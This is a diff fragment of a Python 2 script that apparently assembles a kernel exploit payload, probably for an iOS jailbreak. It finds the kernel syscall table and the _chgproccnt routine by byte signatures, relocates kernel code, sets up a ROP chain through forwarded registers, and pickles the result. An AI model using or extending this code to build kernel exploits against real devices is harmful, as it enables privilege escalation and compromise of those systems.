@@ -52,7 +52,13 @@ dmini.init(kernfile, False)
 sysent = dmini.cur.find('- 00 10 86 00') + 4
 
 code_addr = 0x80000400
-weirdfile = dmini.Connection(kcode, rw=True).relocate(dmini.cur, code_addr).nth_segment(0).data()[:-8]
+def my_ls(binary, sym):
+    if sym == '_chgproccnt':
+        # I'm lazy, make this strref later
+        result = dmini.cur.find('+ f0 b5 03 af 2d e9 00 0d .. .. .. .. 05 46 8a 46 4f f0 00 08')
+        print hex(result)
+        return result
+weirdfile = dmini.Connection(kcode, rw=True).relocate(dmini.cur, code_addr, my_ls).nth_segment(0).data()[:-8]
 count = 0
 stuff = ''
 while True:
@@ -122,7 +128,7 @@ set_fwd('R4', obj)
 set_fwd('PC', code_addr)
 
 
-kstuff = finalize(None, must_be_simple=False, should_heapdump=True); 
+kstuff = finalize(None, must_be_simple=False, should_heapdump=False) 
 kstuff.append('\0'*1024)
 
 def set_cache(cachefile):
@@ -313,6 +319,6 @@ else:
     init_sp = 0x10031000
     address = 0x8000
 
-    final = finalize(address, should_heapdump=True)
+    final = finalize(address, should_heapdump=False)
     open(outfile, 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths, 'dylib': False}))
 
